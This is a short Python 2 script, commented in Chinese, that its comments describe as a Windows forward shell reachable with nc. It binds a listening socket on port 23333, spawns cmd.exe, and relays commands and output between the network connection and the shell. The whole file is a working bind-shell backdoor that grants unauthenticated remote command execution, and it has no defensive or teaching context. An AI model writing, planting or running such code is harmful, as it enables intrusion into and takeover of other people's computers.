# coding:utf-8
# winodws的正向shell，也是直接用nc连接就行
from socket import *
import subprocess
import os, threading

def send(talk, proc):
        import time
        while True:
                msg = proc.stdout.readline()
                talk.send(msg)

if __name__ == "__main__":

        #服务器端
        server=socket(AF_INET,SOCK_STREAM)
        server.bind(('1.1.1.1',23333))#目标的ip和端口号
        server.listen(5)
        print 'waiting for connect'
        talk, addr = server.accept()
        print 'connect from',addr

        proc = subprocess.Popen('cmd.exe /K', stdin=subprocess.PIPE,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

        #单独一个线程专门从stdout中read数据
        t = threading.Thread(target = send, args = (talk, proc))
        t.setDaemon(True)
        t.start()
        while True:
                cmd=talk.recv(1024)
                proc.stdin.write(cmd)
                proc.stdin.flush()
        server.close()